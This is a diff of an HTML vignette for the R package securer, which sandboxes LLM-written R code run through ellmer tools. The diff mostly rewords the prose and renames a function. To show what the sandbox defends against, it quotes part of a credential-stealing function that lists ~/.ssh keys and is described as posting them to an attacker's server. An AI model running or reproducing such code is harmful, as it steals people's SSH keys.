@@ -8,9 +8,13 @@
 <title>Using securer with ellmer • securer</title>
 <script src="../deps/jquery-3.6.0/jquery-3.6.0.min.js"></script><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <link href="../deps/bootstrap-5.3.8/bootstrap.min.css" rel="stylesheet">
-<script src="../deps/bootstrap-5.3.8/bootstrap.bundle.min.js"></script><link href="../deps/font-awesome-6.5.2/css/all.min.css" rel="stylesheet">
+<script src="../deps/bootstrap-5.3.8/bootstrap.bundle.min.js"></script><link href="../deps/Hanken_Grotesk-0.4.10/font.css" rel="stylesheet">
+<link href="../deps/Space_Mono-0.4.10/font.css" rel="stylesheet">
+<link href="../deps/Fraunces-0.4.10/font.css" rel="stylesheet">
+<link href="../deps/font-awesome-6.5.2/css/all.min.css" rel="stylesheet">
 <link href="../deps/font-awesome-6.5.2/css/v4-shims.min.css" rel="stylesheet">
-<script src="../deps/headroom-0.11.0/headroom.min.js"></script><script src="../deps/headroom-0.11.0/jQuery.headroom.min.js"></script><script src="../deps/bootstrap-toc-1.0.1/bootstrap-toc.min.js"></script><script src="../deps/clipboard.js-2.0.11/clipboard.min.js"></script><script src="../deps/search-1.0.0/autocomplete.jquery.min.js"></script><script src="../deps/search-1.0.0/fuse.min.js"></script><script src="../deps/search-1.0.0/mark.min.js"></script><!-- pkgdown --><script src="../pkgdown.js"></script><meta property="og:title" content="Using securer with ellmer">
+<script src="../deps/headroom-0.11.0/headroom.min.js"></script><script src="../deps/headroom-0.11.0/jQuery.headroom.min.js"></script><script src="../deps/bootstrap-toc-1.0.1/bootstrap-toc.min.js"></script><script src="../deps/clipboard.js-2.0.11/clipboard.min.js"></script><script src="../deps/search-1.0.0/autocomplete.jquery.min.js"></script><script src="../deps/search-1.0.0/fuse.min.js"></script><script src="../deps/search-1.0.0/mark.min.js"></script><!-- pkgdown --><script src="../pkgdown.js"></script><link href="../extra.css" rel="stylesheet">
+<meta property="og:title" content="Using securer with ellmer">
 </head>
 <body>
     <a href="#main" class="visually-hidden-focusable">Skip to contents</a>
@@ -36,7 +40,7 @@
 <li class="nav-item"><form class="form-inline" role="search">
  <input class="form-control" type="search" name="search-input" id="search-input" autocomplete="off" aria-label="Search site" placeholder="Search for" data-search-index="../search.json">
 </form></li>
-<li class="nav-item"><a class="external-link nav-link" href="https://github.com/ian-flores/securer"><span class="fa fa-github"></span></a></li>
+<li class="nav-item"><a class="external-link nav-link" href="https://github.com/ian-flores/securer" aria-label="securer on GitHub"><span class="fa fa-github"></span></a></li>
       </ul>
 </div>
 
@@ -60,16 +64,13 @@
     
     
 <div class="section level2">
-<h2 id="overview">Overview<a class="anchor" aria-label="anchor" href="#overview"></a>
+<h2 id="what-this-is-for">What this is for<a class="anchor" aria-label="anchor" href="#what-this-is-for"></a>
 </h2>
 <p><a href="https://ellmer.tidyverse.org/" class="external-link">ellmer</a> is an R package
-for chatting with LLMs. securer integrates with ellmer’s tool-use system
-so an LLM can execute R code in a sandboxed child process. The LLM
-writes code, securer runs it safely, and the result flows back into the
-conversation.</p>
-<p><code><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> connects the two packages. It
-wraps a <code>SecureSession</code> as an ellmer tool definition that you
-register on a chat object.</p>
+for chatting with LLMs, and it lets the model call tools.
+<code><a href="../reference/as_ellmer_tool.html">as_ellmer_tool()</a></code> turns a <code>SecureSession</code> into
+one of those tools. Register it on a chat, and the model can write R
+code, have securer run it in the sandbox, and read the result.</p>
 </div>
 <div class="section level2">
 <h2 id="quick-start">Quick start<a class="anchor" aria-label="anchor" href="#quick-start"></a>
@@ -79,24 +80,24 @@ register on a chat object.</p>
 <span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ellmer.tidyverse.org" class="external-link">ellmer</a></span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
+<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"What is the sum of the first 100 prime numbers?"</span><span class="op">)</span></span></code></pre></div>
-<p>The LLM receives a tool called <code>execute_r_code</code> that
-accepts a <code>code</code> string. When the model decides to use it,
-securer runs the code in a sandboxed child process and returns the
-result. The sandbox blocks filesystem writes and network access. The LLM
-can compute but not exfiltrate.</p>
+<p>The model sees a tool called <code>execute_r_code</code> that takes
+one argument, <code>code</code>. When the model calls it, securer runs
+the code in the sandbox and sends back the result. The code can compute
+whatever it likes, but it can’t write to your files or send anything
+over the network.</p>
 </div>
 <div class="section level2">
-<h2 id="why-securer-a-real-supply-chain-attack">Why securer? A real supply chain attack<a class="anchor" aria-label="anchor" href="#why-securer-a-real-supply-chain-attack"></a>
+<h2 id="why-bother-an-example-attack">Why bother: an example attack<a class="anchor" aria-label="anchor" href="#why-bother-an-example-attack"></a>
 </h2>
-<p>Without a sandbox, LLM-generated code runs with your full
+<p>Without a sandbox, code the model writes runs with all of your
 permissions. The <a href="https://github.com/ian-flores/showittome" class="external-link">showittome</a> package
-demonstrates the risk: it scans <code>~/.ssh</code> for private keys and
-POSTs them to an attacker-controlled server.</p>
+shows what that can mean. It looks in <code>~/.ssh</code> for private
+keys and posts them to a server the attacker controls.</p>
 <div class="sourceCode" id="cb2"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="co"># From https://github.com/ian-flores/showittome/blob/master/R_pkg/R/grabber.R</span></span>
-<span><span class="co"># DO NOT RUN --- this is the attack we're defending against</span></span>
+<span><span class="co"># DO NOT RUN: this is the attack</span></span>
 <span><span class="va">grabber</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="op">)</span> <span class="op">{</span></span>
 <span>  <span class="va">ssh_files</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/list.files.html" class="external-link">list.files</a></span><span class="op">(</span>path <span class="op">=</span> <span class="st">"~/.ssh"</span><span class="op">)</span></span>
 <span>  <span class="kw">for</span> <span class="op">(</span><span class="va">file</span> <span class="kw">in</span> <span class="va">ssh_files</span><span class="op">)</span> <span class="op">{</span></span>
@@ -116,7 +117,7 @@ POSTs them to an attacker-controlled server.</p>
 <span>    <span class="op">}</span></span>
 <span>  <span class="op">}</span></span>
 <span><span class="op">}</span></span></code></pre></div>
-<p>With securer, every step of this attack fails:</p>
+<p>In a securer session, each step fails:</p>
 <div class="sourceCode" id="cb3"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSession.html">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>sandbox <span class="op">=</span> <span class="cn">TRUE</span><span class="op">)</span></span>
 <span></span>
@@ -175,35 +176,36 @@ POSTs them to an attacker-controlled server.</p>
 </tr>
 </tbody>
 </table>
-<p>These are independent defense layers. See
-<code><a href="../articles/security-model.html">vignette("security-model")</a></code> for the full threat model.</p>
+<p>Each step is stopped by a different restriction, so one gap doesn’t
+undo the rest. <code><a href="../articles/security-model.html">vignette("security-model")</a></code> has the
+details.</p>
 </div>
 <div class="section level2">
 <h2 id="how-it-works">How it works<a class="anchor" aria-label="anchor" href="#how-it-works"></a>
 </h2>
-<p><code><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> creates a
-<code>SecureSession</code> (or uses one you provide) and returns an
-ellmer <code>ToolDef</code> with a single <code>code</code> argument.
-When the LLM invokes it, securer sends the code to the sandboxed child,
-gets the result, and returns it as a string. Errors are returned as
-<code>ContentToolResult(error = ...)</code> so the LLM can react without
-crashing the chat loop.</p>
-<p>See <code><a href="../articles/deployment.html">vignette("deployment")</a></code> for the full architecture
-diagram.</p>
+<p><code><a href="../reference/as_ellmer_tool.html">as_ellmer_tool()</a></code> starts a <code>SecureSession</code>, or
+uses one you pass in, and returns an ellmer <code>ToolDef</code> with a
+single <code>code</code> argument. When the model calls it, securer runs
+the code in the session and returns the result as a string. If something
+goes wrong, the error goes back to the model as
+<code>ContentToolResult(error = ...)</code>, so the chat keeps
+going.</p>
+<p>There’s a diagram of the whole round trip in
+<code><a href="../articles/deployment.html">vignette("deployment")</a></code>.</p>
 </div>
 <div class="section level2">
 <h2 id="adding-securer-tools">Adding securer tools<a class="anchor" aria-label="anchor" href="#adding-securer-tools"></a>
 </h2>
-<p>You can expose your own functions to the LLM as securer tools:</p>
+<p>You can also give the model’s code your own functions, as securer
+tools:</p>
 <div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">tools</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span></span>
 <span>  <span class="fu"><a href="../reference/securer_tool.html">securer_tool</a></span><span class="op">(</span><span class="st">"query_db"</span>, <span class="st">"Query a database table by name"</span>,</span>
 <span>    fn <span class="op">=</span> <span class="kw">function</span><span class="op">(</span><span class="va">table</span>, <span class="va">limit</span><span class="op">)</span> <span class="op">{</span></span>
 <span>      <span class="va">con</span> <span class="op">&lt;-</span> <span class="fu">DBI</span><span class="fu">::</span><span class="fu"><a href="https://dbi.r-dbi.org/reference/dbConnect.html" class="external-link">dbConnect</a></span><span class="op">(</span><span class="fu">RSQLite</span><span class="fu">::</span><span class="fu"><a href="https://rsqlite.r-dbi.org/reference/SQLite.html" class="external-link">SQLite</a></span><span class="op">(</span><span class="op">)</span>, <span class="st">"data.db"</span><span class="op">)</span></span>
 <span>      <span class="fu"><a href="https://rdrr.io/r/base/on.exit.html" class="external-link">on.exit</a></span><span class="op">(</span><span class="fu">DBI</span><span class="fu">::</span><span class="fu"><a href="https://dbi.r-dbi.org/reference/dbDisconnect.html" class="external-link">dbDisconnect</a></span><span class="op">(</span><span class="va">con</span><span class="op">)</span><span class="op">)</span></span>
-<span>      <span class="co"># Allowlist table names to prevent SQL injection -- the LLM</span></span>
-<span>      <span class="co"># controls the `table` argument, so it must never be interpolated</span></span>
-<span>      <span class="co"># directly into SQL.</span></span>
+<span>      <span class="co"># The LLM controls `table`, so check it against the real table</span></span>
+<span>      <span class="co"># names and never paste it into SQL as is.</span></span>
 <span>      <span class="va">allowed</span> <span class="op">&lt;-</span> <span class="fu">DBI</span><span class="fu">::</span><span class="fu"><a href="https://dbi.r-dbi.org/reference/dbListTables.html" class="external-link">dbListTables</a></span><span class="op">(</span><span class="va">con</span><span class="op">)</span></span>
 <span>      <span class="kw">if</span> <span class="op">(</span><span class="op">!</span><span class="va">table</span> <span class="op"><a href="https://rdrr.io/r/base/match.html" class="external-link">%in%</a></span> <span class="va">allowed</span><span class="op">)</span> <span class="kw"><a href="https://rdrr.io/r/base/stop.html" class="external-link">stop</a></span><span class="op">(</span><span class="st">"Unknown table: "</span>, <span class="va">table</span><span class="op">)</span></span>
 <span>      <span class="fu">DBI</span><span class="fu">::</span><span class="fu"><a href="https://dbi.r-dbi.org/reference/dbGetQuery.html" class="external-link">dbGetQuery</a></span><span class="op">(</span></span>
@@ -224,33 +226,34 @@ diagram.</p>
 <span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span>tools <span class="op">=</span> <span class="va">tools</span><span class="op">)</span><span class="op">)</span></span>
+<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span>tools <span class="op">=</span> <span class="va">tools</span><span class="op">)</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"What tables are available? Show me the first 5 rows of each."</span><span class="op">)</span></span></code></pre></div>
-<p>The LLM’s code runs sandboxed, but <code>query_db()</code> and
-<code>list_tables()</code> execute on the host with full database
-access. The sandbox ensures the LLM can only interact with your data
-through the tools you define.</p>
+<p>The model’s code runs in the sandbox, but <code>query_db()</code> and
+<code>list_tables()</code> run in your session, with full access to the
+database. So the model can reach your data, but only through the
+functions you wrote.</p>
 </div>
 <div class="section level2">
 <h2 id="configuring-the-session">Configuring the session<a class="anchor" aria-label="anchor" href="#configuring-the-session"></a>
 </h2>
-<p><code><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> accepts the same options as
-<code>SecureSession</code>:</p>
+<p><code><a href="../reference/as_ellmer_tool.html">as_ellmer_tool()</a></code> takes <code>tools</code>,
+<code>sandbox</code>, and <code>limits</code>, which it passes to the
+session it creates, and a <code>timeout</code> for each call:</p>
 <div class="sourceCode" id="cb5"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="va">tool_def</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span></span>
+<code class="sourceCode R"><span><span class="va">tool_def</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span></span>
 <span>  tools <span class="op">=</span> <span class="va">tools</span>,</span>
 <span>  sandbox <span class="op">=</span> <span class="cn">TRUE</span>,</span>
 <span>  limits <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>cpu <span class="op">=</span> <span class="fl">30</span>, memory <span class="op">=</span> <span class="fl">512</span> <span class="op">*</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span><span class="op">)</span>,</span>
 <span>  timeout <span class="op">=</span> <span class="fl">15</span></span>
 <span><span class="op">)</span></span></code></pre></div>
-<p>See <code><a href="../articles/deployment.html">vignette("deployment")</a></code> for details on sandbox modes,
-resource limits, and timeouts.</p>
+<p><code><a href="../articles/deployment.html">vignette("deployment")</a></code> explains the sandbox and the
+resource limits.</p>
 </div>
 <div class="section level2">
 <h2 id="using-a-pre-existing-session">Using a pre-existing session<a class="anchor" aria-label="anchor" href="#using-a-pre-existing-session"></a>
 </h2>
-<p>If you need more control over the session lifecycle, create one
-yourself and pass it in:</p>
+<p>For other session options, or to control when the session starts and
+stops, create the session yourself and pass it in:</p>
 <div class="sourceCode" id="cb6"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSession.html">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span></span>
 <span>  tools <span class="op">=</span> <span class="va">tools</span>,</span>
@@ -259,32 +262,35 @@ yourself and pass it in:</p>
 <span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span>session <span class="op">=</span> <span class="va">session</span><span class="op">)</span><span class="op">)</span></span>
+<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span>session <span class="op">=</span> <span class="va">session</span><span class="op">)</span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Analyze the sales table and compute monthly totals."</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Now plot the trend."</span><span class="op">)</span>  <span class="co"># Same session, state persists</span></span>
 <span></span>
-<span><span class="co"># You own the session --- close it when done</span></span>
+<span><span class="co"># It's your session, so close it when you're done</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
-<p>When you provide your own session, securer does not create or close
-one internally. This gives you control over verbose/audit logging, state
-persistence across chat turns, and session reuse across chat
-objects.</p>
+<p>When you pass a session, <code><a href="../reference/as_ellmer_tool.html">as_ellmer_tool()</a></code> ignores
+<code>tools</code>, <code>sandbox</code>, and <code>limits</code>, and
+never closes the session for you. That lets you turn on verbose output
+or an audit log, and share one session between chats.</p>
 </div>
 <div class="section level2">
 <h2 id="result-formatting">Result formatting<a class="anchor" aria-label="anchor" href="#result-formatting"></a>
 </h2>
-<p>securer converts R values to strings before returning them to the
-LLM. Data frames are truncated at 30 rows, other output at 50 lines.
-This prevents large results from consuming the LLM’s context window.</p>
+<p>securer turns the result into text before the model sees it. A data
+frame is cut to its first 30 printed lines, with a note giving the total
+number of rows. Anything else is cut at 50 lines. Big results would
+otherwise fill up the model’s context.</p>
 </div>
 <div class="section level2">
 <h2 id="error-handling">Error handling<a class="anchor" aria-label="anchor" href="#error-handling"></a>
 </h2>
-<p>Errors (syntax, runtime, timeout, dead session, type mismatches) are
-returned to the LLM as <code>ContentToolResult(error = ...)</code>
-rather than R exceptions. The chat loop continues and the LLM can retry
-or explain the error.</p>
+<p>Syntax errors, runtime errors, timeouts, a dead session, and tool
+arguments of the wrong type all go back to the model as
+<code>ContentToolResult(error = ...)</code> instead of stopping your R
+code. The model can then fix its code and try again, or explain what
+went wrong. The error text has file paths and similar details removed
+first.</p>
 </div>
 <div class="section level2">
 <h2 id="example-data-analysis-assistant">Example: data analysis assistant<a class="anchor" aria-label="anchor" href="#example-data-analysis-assistant"></a>
@@ -317,7 +323,7 @@ or explain the error.</p>
 <span>    <span class="st">"Available R tools: load_csv(path), save_plot(filename)."</span></span>
 <span>  <span class="op">)</span></span>
 <span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span></span>
+<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span></span>
 <span>  tools <span class="op">=</span> <span class="va">tools</span>,</span>
 <span>  timeout <span class="op">=</span> <span class="fl">60</span>,</span>
 <span>  limits <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>memory <span class="op">=</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span><span class="op">)</span></span>
@@ -329,31 +335,31 @@ or explain the error.</p>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Create a scatter plot of price vs quantity"</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="using-with-other-llm-providers">Using with other LLM providers<a class="anchor" aria-label="anchor" href="#using-with-other-llm-providers"></a>
+<h2 id="other-providers">Other providers<a class="anchor" aria-label="anchor" href="#other-providers"></a>
 </h2>
-<p>The tool definition is provider-agnostic. Any ellmer backend with
-tool-use support works:</p>
+<p>The tool works with any ellmer provider that supports tool calls:</p>
 <div class="sourceCode" id="cb8"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
+<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
 <span></span>
 <span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_ollama.html" class="external-link">chat_ollama</a></span><span class="op">(</span>model <span class="op">=</span> <span class="st">"llama3"</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span></code></pre></div>
+<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span></code></pre></div>
 </div>
 <div class="section level2">
-<h2 id="session-pooling">Session pooling<a class="anchor" aria-label="anchor" href="#session-pooling"></a>
+<h2 id="many-users-at-once">Many users at once<a class="anchor" aria-label="anchor" href="#many-users-at-once"></a>
 </h2>
-<p>For concurrent users, use <code>SecureSessionPool</code> for raw code
-execution or per-request sessions for ellmer chats:</p>
+<p>If you run code directly, a <code>SecureSessionPool</code> hands out
+sessions for you. For ellmer chats, give each request its own tool and
+session:</p>
 <div class="sourceCode" id="cb9"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="co"># Raw code execution: pool handles acquire/release</span></span>
+<code class="sourceCode R"><span><span class="co"># Running code directly: the pool hands out and takes back sessions</span></span>
 <span><span class="va">pool</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSessionPool.html">SecureSessionPool</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>size <span class="op">=</span> <span class="fl">4</span>, tools <span class="op">=</span> <span class="va">tools</span>, sandbox <span class="op">=</span> <span class="cn">TRUE</span><span class="op">)</span></span>
 <span><span class="va">handle_user_code</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">code</span><span class="op">)</span> <span class="va">pool</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="va">code</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span></span>
 <span></span>
-<span><span class="co"># ellmer chats: one session per request, cleaned up on GC</span></span>
+<span><span class="co"># ellmer chats: one session per request, closed when garbage collected</span></span>
 <span><span class="va">handle_user_chat</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">user_message</span><span class="op">)</span> <span class="op">{</span></span>
 <span>  <span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span>  <span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span>tools <span class="op">=</span> <span class="va">tools</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span><span class="op">)</span></span>
+<span>  <span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/as_ellmer_tool.html">as_ellmer_tool</a></span><span class="op">(</span>tools <span class="op">=</span> <span class="va">tools</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span><span class="op">)</span></span>
 <span>  <span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="va">user_message</span><span class="op">)</span></span>
 <span><span class="op">}</span></span></code></pre></div>
 </div>
@@ -364,7 +370,20 @@ execution or per-request sessions for ellmer chats:</p>
 
 
     <footer><div class="pkgdown-footer-left">
-  <p>Developed by Ian Flores Siaca.</p>
+  <div class="title-block">
+<div>
+<b>Sheet</b>1 of 4
+</div>
+<div>
+<b>Quadrangle</b>securer
+</div>
+<div>
+<b>Survey</b>Sandbox
+</div>
+<div>
+<b>Series</b>secure-r-dev
+</div>
+</div>
 </div>
 
 <div class="pkgdown-footer-right">
